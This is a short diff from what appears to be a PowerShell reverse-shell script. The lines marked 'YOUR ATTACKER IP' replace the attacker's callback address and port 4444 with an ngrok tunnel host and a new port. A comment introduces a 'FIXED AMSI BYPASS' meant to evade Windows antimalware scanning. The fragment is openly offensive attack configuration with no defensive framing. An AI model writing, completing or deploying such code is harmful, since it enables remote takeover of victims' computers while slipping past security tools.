@@ -5,8 +5,8 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 # YOUR ATTACKER IP
-$ip = "103.52.208.8"
-$port = 4444
+$ip = "0.tcp.in.ngrok.io"
+$port = 16450
 
 # 1. FIXED AMSI BYPASS (with null check)
 try {
